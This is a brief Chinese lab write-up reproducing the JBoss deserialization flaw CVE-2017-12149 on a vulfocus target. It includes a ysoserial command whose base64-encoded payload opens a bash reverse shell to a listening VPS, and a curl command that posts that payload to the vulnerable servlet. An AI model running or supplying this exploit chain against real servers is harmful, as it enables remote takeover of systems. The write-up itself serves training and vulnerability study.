jboss-反序列化漏洞

原文：http://mp.weixin.qq.com/s?__biz=MzkxNTM0MTIzMA==&mid=2247484197&idx=1&sn=3bb0d7a66ff92fb277dd9128c5e72cdf&chksm=c161e9e4f61660f25e59db7600ed27650b68350e782424095fb158116240bd3014f66e83b32b&scene=126&sessionid=1681573001#rd

环境信息

靶场环境：vulfocus

漏洞描述：JBoss在 /invoker/JMXInvokerServlet 请求中读取了用户传入的对象存在反序列化漏洞。

漏洞编号：CVE-2017-12149

影响版本：

JBoss Enterprise Application Platform 6.4.4,5.2.0,4.3.0_CP10

JBoss AS (Wildly) 6 and earlier

JBoss A-MQ 6.2.0

JBoss Fuse 6.2.0

JBoss SOA Platform (SOA-P) 5.3.1

JBoss Data Grid (JDG) 6.5.0

JBoss BRMS (BRMS) 6.1.0

JBoss BPMS (BPMS) 6.1.0

JBoss Data Virtualization (JDV) 6.1.0

JBoss Fuse Service Works (FSW) 6.0.0

JBoss Enterprise Web Server (EWS) 2.1,3.0

利用路径：/invoker/JMXInvokerServlet

漏洞复现：


进入目标站点



使用ysoserial工具生成序列化数据，并重定向到banlu.ser文件


java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjIxMi4yMi80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i} " >banlu.ser


vps监听4444端口

发送攻击载荷到 /invoker/JMXInvokerServlet

curl http://121.5.66.207:22231/invoker/JMXInvokerServlet --data-binary @banlu.ser

返回vps监听状态查看回显shell执行命令获取flag
